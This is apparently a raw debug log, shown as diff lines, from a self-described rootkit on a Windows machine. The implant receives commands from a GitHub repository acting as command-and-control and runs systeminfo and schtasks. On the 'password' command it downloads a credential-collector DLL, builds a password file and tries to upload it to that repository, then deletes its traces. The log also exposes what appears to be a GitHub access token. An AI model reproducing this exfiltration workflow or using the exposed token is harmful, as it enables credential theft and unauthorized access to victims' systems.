+DEBUG: Thu Sep  2 22:24:38 2021: Command received: execute_cmd
+DEBUG: Thu Sep  2 22:24:38 2021: The following command will be executed by powershell: systeminfo > C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\target_command1.log
+DEBUG: Thu Sep  2 22:24:38 2021: Start of the method readFileWindowsApi for the file: C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\target_command1.log
+DEBUG: Thu Sep  2 22:24:38 2021: The file that will be read weight: 4566
+DEBUG: Thu Sep  2 22:24:38 2021: Success to read the binary file. This number of bytes have been read: 4567
+DEBUG: Thu Sep  2 22:24:38 2021: Success to delete the temporary file that store the powershell output
+DEBUG: Thu Sep  2 22:24:38 2021: Start of the method writeFileWindowsApi.
+DEBUG: Thu Sep  2 22:24:38 2021: The content size that will be written: 4567
+DEBUG: Thu Sep  2 22:24:38 2021: Success to write the content(number of bytes : 4567) in the file : C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\target_command1.log
+DEBUG: Thu Sep  2 22:24:38 2021: The file target_command.log exists, trying to upload it content.
+DEBUG: Thu Sep  2 22:24:38 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Thu Sep  2 22:24:38 2021: Start of the method readFileWindowsApi for the file: C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\target_command1.log
+DEBUG: Thu Sep  2 22:24:38 2021: The file that will be read weight: 4567
+DEBUG: Thu Sep  2 22:24:38 2021: Success to read the binary file. This number of bytes have been read: 4568
+DEBUG: Thu Sep  2 22:24:39 2021: The files C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\target_command1.log has not been uploaded in the github repo with the name: C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\target_command1.log. Here is the answer of the api : {
+  "message": "C:\\Users\\gilles\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState\\MobilityExperience\\target_command1.log does not match ",
+  "documentation_url": "https://docs.github.com/rest/reference/repos#create-or-update-file-contents"
+}
+
+DEBUG: Thu Sep  2 22:24:39 2021: Url: https://api.github.com/repos/hidemepls785/furry-octo-parakeet/contents/C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\target_command1.log credentials: hidemepls785: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
+DEBUG: Thu Sep  2 22:24:39 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Thu Sep  2 22:24:39 2021: #####################################################
+
+DEBUG: Thu Sep  2 22:24:39 2021: Start of GithubCommunication::sendResults
+DEBUG: Thu Sep  2 22:24:39 2021: The place of the rootkit has not been found on the json
+DEBUG: Thu Sep  2 22:24:39 2021: Unable to have send sucess, trying another loop.
+DEBUG: Thu Sep  2 22:24:39 2021: Start of a new loop to get commands and treat them.
+DEBUG: Thu Sep  2 22:24:39 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Thu Sep  2 22:24:39 2021: Success to get the instance number of the current instance: rootkit_path1
+DEBUG: Thu Sep  2 22:24:39 2021: Success to check the commands with rootkit_path1
+DEBUG: Thu Sep  2 22:24:39 2021: Getting this command from the github repo: schtasks //query //TN "WindowsRegistryUpdate"
+DEBUG: Thu Sep  2 22:24:39 2021: Getting this command from the github repo: password
+DEBUG: Thu Sep  2 22:24:39 2021: Getting this command from the github repo: execute_cmd systeminfo
+DEBUG: Thu Sep  2 22:24:39 2021: Start to treat the commands sent by the github repo.
+DEBUG: Thu Sep  2 22:24:39 2021: The command stay_alive has not been received, the rootkit will end the execution after treating the commands.
+DEBUG: Thu Sep  2 22:24:39 2021: Command received: schtasks
+DEBUG: Thu Sep  2 22:24:39 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Thu Sep  2 22:24:39 2021: #####################################################
+
+DEBUG: Thu Sep  2 22:24:39 2021: The command stay_alive has not been received, the rootkit will end the execution after treating the commands.
+DEBUG: Thu Sep  2 22:24:39 2021: Command received: password
+DEBUG: Thu Sep  2 22:24:39 2021: Start of the method messageManagerPasswordModule.
+DEBUG: Thu Sep  2 22:24:39 2021: Start of the method downloadFileFromGithubRepo with this file in the github repo: CredentialsCollectorDll.dll
+DEBUG: Thu Sep  2 22:24:40 2021: The answer of the github API seems to be correct for the file.
+DEBUG: Thu Sep  2 22:24:40 2021: The size of the content of the file is: 343040
+DEBUG: Thu Sep  2 22:24:40 2021: Start of the method writeFileWindowsApi.
+DEBUG: Thu Sep  2 22:24:40 2021: The content size that will be written: 343040
+ERROR: Thu Sep  2 22:24:40 2021: Unable to get an handle to the file. Last Windows error: 80
+DEBUG: Thu Sep  2 22:24:40 2021: Start of the method CredentialsDllHandlerMain with the file: C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\CredentialsCollectorDll.dll
+DEBUG: Thu Sep  2 22:24:40 2021: Success to have an handle to the credential dll.
+DEBUG: Thu Sep  2 22:24:40 2021: End of the execution of the password dll.
+DEBUG: Thu Sep  2 22:24:40 2021: The file that contains passwords has been created.
+DEBUG: Thu Sep  2 22:24:40 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Thu Sep  2 22:24:40 2021: Start of the method readFileWindowsApi for the file: C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\password_output.txt
+DEBUG: Thu Sep  2 22:24:40 2021: The file that will be read weight: 2378
+DEBUG: Thu Sep  2 22:24:40 2021: Success to read the binary file. This number of bytes have been read: 2379
+DEBUG: Thu Sep  2 22:24:41 2021: The files C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\password_output.txt has not been uploaded in the github repo with the name: C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\password_output.txt. Here is the answer of the api : {
+  "message": "C:\\Users\\gilles\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState\\MobilityExperience\\password_output.txt does not match ",
+  "documentation_url": "https://docs.github.com/rest/reference/repos#create-or-update-file-contents"
+}
+
+DEBUG: Thu Sep  2 22:24:41 2021: Url: https://api.github.com/repos/hidemepls785/furry-octo-parakeet/contents/C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\password_output.txt credentials: hidemepls785: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
+DEBUG: Thu Sep  2 22:24:41 2021: Start of DeleteFileRandomFolder : Try to delete the file in the random folder: password_output.txt
+DEBUG: Thu Sep  2 22:24:41 2021: The file truely exists in the random folder.
+DEBUG: Thu Sep  2 22:24:41 2021: Success to delete the file. End of the method
+DEBUG: Thu Sep  2 22:24:41 2021: Start of DeleteFileRandomFolder : Try to delete the file in the random folder: chromepassword
+DEBUG: Thu Sep  2 22:24:41 2021: The file does not exist in the random folder. Aborting.
+DEBUG: Thu Sep  2 22:24:41 2021: Start of DeleteFileRandomFolder : Try to delete the file in the random folder: CredentialsCollectorDll.dll
+DEBUG: Thu Sep  2 22:24:41 2021: The file truely exists in the random folder.
+ERROR: Thu Sep  2 22:24:41 2021: Fail to delete the file. Here is the last windows error: 5
+DEBUG: Thu Sep  2 22:24:41 2021: End of the method messageManagerPasswordModule.
+DEBUG: Thu Sep  2 22:24:41 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Thu Sep  2 22:24:41 2021: #####################################################
+
+DEBUG: Thu Sep  2 22:24:41 2021: The command stay_alive has not been received, the rootkit will end the execution after treating the commands.
+DEBUG: Thu Sep  2 22:24:41 2021: Command received: execute_cmd
+DEBUG: Thu Sep  2 22:24:41 2021: The following command will be executed by powershell: systeminfo > C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\target_command1.log
+DEBUG: Thu Sep  2 22:24:41 2021: Start of the method readFileWindowsApi for the file: C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\target_command1.log
+DEBUG: Thu Sep  2 22:24:41 2021: The file that will be read weight: 4566
+DEBUG: Thu Sep  2 22:24:41 2021: Success to read the binary file. This number of bytes have been read: 4567
+DEBUG: Thu Sep  2 22:24:41 2021: Success to delete the temporary file that store the powershell output
+DEBUG: Thu Sep  2 22:24:41 2021: Start of the method writeFileWindowsApi.
+DEBUG: Thu Sep  2 22:24:41 2021: The content size that will be written: 4567
+DEBUG: Thu Sep  2 22:24:41 2021: Success to write the content(number of bytes : 4567) in the file : C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\target_command1.log
+DEBUG: Thu Sep  2 22:24:41 2021: The file target_command.log exists, trying to upload it content.
+DEBUG: Thu Sep  2 22:24:41 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Thu Sep  2 22:24:41 2021: Start of the method readFileWindowsApi for the file: C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\target_command1.log
+DEBUG: Thu Sep  2 22:24:41 2021: The file that will be read weight: 4567
+DEBUG: Thu Sep  2 22:24:41 2021: Success to read the binary file. This number of bytes have been read: 4568
+DEBUG: Thu Sep  2 22:24:41 2021: The files C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\target_command1.log has not been uploaded in the github repo with the name: C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\target_command1.log. Here is the answer of the api : {
+  "message": "C:\\Users\\gilles\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState\\MobilityExperience\\target_command1.log does not match ",
+  "documentation_url": "https://docs.github.com/rest/reference/repos#create-or-update-file-contents"
+}
+
+DEBUG: Thu Sep  2 22:24:41 2021: Url: https://api.github.com/repos/hidemepls785/furry-octo-parakeet/contents/C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\target_command1.log credentials: hidemepls785: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
+DEBUG: Thu Sep  2 22:24:41 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Thu Sep  2 22:24:41 2021: #####################################################
+
+DEBUG: Thu Sep  2 22:24:41 2021: Start of GithubCommunication::sendResults
+DEBUG: Thu Sep  2 22:24:42 2021: The place of the rootkit has not been found on the json
+DEBUG: Thu Sep  2 22:24:42 2021: Unable to have send sucess, trying another loop.
+DEBUG: Thu Sep  2 22:24:42 2021: This is the end of servant mission.
+DEBUG: Thu Sep  2 22:24:42 2021: Start of GithubCommunication::sendLogs
